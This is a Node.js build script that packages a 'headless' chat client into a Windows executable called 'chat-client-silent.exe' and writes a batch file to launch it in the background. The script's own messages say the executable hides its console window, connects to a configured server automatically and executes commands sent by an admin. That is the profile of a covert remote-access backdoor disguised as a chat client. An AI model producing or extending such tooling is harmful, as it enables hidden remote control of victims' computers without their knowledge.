const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

console.log('Building silent Windows executable...');

// First, let's ensure the client connects to the right server
const clientPath = path.join(__dirname, 'client-headless.js');
let clientCode = fs.readFileSync(clientPath, 'utf8');

// Check current URL
const urlMatch = clientCode.match(/const SERVER_URL = '(.*)';/);
if (urlMatch) {
  console.log(`Current server URL: ${urlMatch[1]}`);
  console.log('Make sure to update the URL using ./configure-silent.sh if needed');
}

// Build command with Windows subsystem flag
const buildCmd = 'pkg client-headless.js --targets node18-win-x64 --output dist/chat-client-silent.exe';

exec(buildCmd, (error, stdout, stderr) => {
  if (error) {
    console.error('Build failed:', error);
    return;
  }
  
  console.log('Build output:', stdout);
  if (stderr) console.error('Build warnings:', stderr);
  
  console.log('\nSilent Windows executable created: dist/chat-client-silent.exe');
  console.log('\nThis executable will:');
  console.log('- Run without showing any console window when double-clicked');
  console.log('- Connect to the configured server automatically');
  console.log('- Execute commands sent from admin');
  console.log('- Terminate when room is deleted');
  
  // Create a batch file for testing
  const batchContent = `@echo off
start "" "%~dp0dist\chat-client-silent.exe"
echo Client started in background
pause`;
  
  fs.writeFileSync('test-silent.bat', batchContent);
  console.log('\nCreated test-silent.bat for testing');
});